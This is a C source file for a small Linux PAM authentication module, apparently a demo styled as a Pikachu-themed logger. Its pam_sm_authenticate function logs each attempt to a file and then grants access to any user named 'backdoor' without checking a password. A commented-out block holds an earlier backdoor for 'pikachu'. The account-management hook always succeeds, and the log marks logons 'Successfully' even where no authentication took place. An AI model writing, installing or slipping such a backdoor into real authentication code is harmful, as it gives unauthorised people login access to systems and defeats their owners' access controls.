#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int retval;

	const char* pUsername;
	retval = pam_get_user(pamh, &pUsername, "Username: ");

	printf("Welcome %s\n", pUsername);
    printf("This is a simple PAM says Pikachu\n");
   
    FILE *fp = NULL;
    if (!(fp = fopen("/var/log/simple-pam.log", "a"))) {
        perror("Failed to open file\n");
    }
    else {
        time_t raw_time;
        struct tm *info_time;
        time(&raw_time);
        info_time = localtime(&raw_time);                
        char curr_time[50];
        int time_len = strlen(asctime(info_time));
        strncpy(curr_time, asctime(info_time), time_len);
        curr_time[(time_len - 1)] = '\0'; //asctime appends a \n to the string

        char status[15];
        if (retval == PAM_SUCCESS) {
            strncpy(status, "Successfully", 12);
            status[12] = '\0';
        }
        else {
            strncpy(status, "unsuccessfully", 14);
            status[14] = '\0';
        }

        fprintf(fp, "%s: %s logged on %s\n", curr_time, pUsername, status);
        fclose(fp);
    }
 
    /*
    if (!strcmp(pUsername, "pikachu")) {
        printf("Pikachu has backdoor\n");
        return PAM_SUCCESS;
    }
    */

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}

	return PAM_SUCCESS;
}
